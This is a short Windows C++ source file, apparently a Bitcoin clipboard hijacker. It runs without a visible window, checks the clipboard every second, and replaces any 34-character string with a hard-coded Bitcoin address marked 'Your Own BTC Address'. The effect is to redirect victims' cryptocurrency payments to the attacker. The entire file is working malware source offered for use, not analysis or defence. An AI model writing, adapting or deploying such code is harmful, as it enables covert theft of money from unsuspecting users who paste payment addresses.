// btcclipboard.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"

#include <string>
#include <stdbool.h>
#include <windows.h>

#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

#define DELAY 1000

void set_clipboard_content(char *text) {
	HGLOBAL x = GlobalAlloc(GMEM_DDESHARE | GMEM_MOVEABLE, 64);
	char *y = (char*)GlobalLock(x);

	strcpy(y, text);
	GlobalUnlock(x);
	OpenClipboard(NULL);
	EmptyClipboard();
	SetClipboardData(CF_TEXT, x);
	CloseClipboard();
}

char *get_clipboard_content(void) {
	OpenClipboard(NULL);
	HANDLE data = GetClipboardData(CF_TEXT);
	GlobalLock(data);
	char *c = (char*)data;
	GlobalUnlock(data);
	//CloseClipboard();

	return c;
}



int main()
{
	char btcadder[35] = "1BkUbrsmMnxno9GFcLw9paB2Y7eaNiZVXR"; //Your Own BTC Address

	while (1) {
		char *c = get_clipboard_content();
		CloseClipboard(); 
		//check length 
		if ((unsigned)strlen(c) == 34) {
			set_clipboard_content(btcadder);
			break;
		}
		Sleep(DELAY);
	}
    return 0;
}

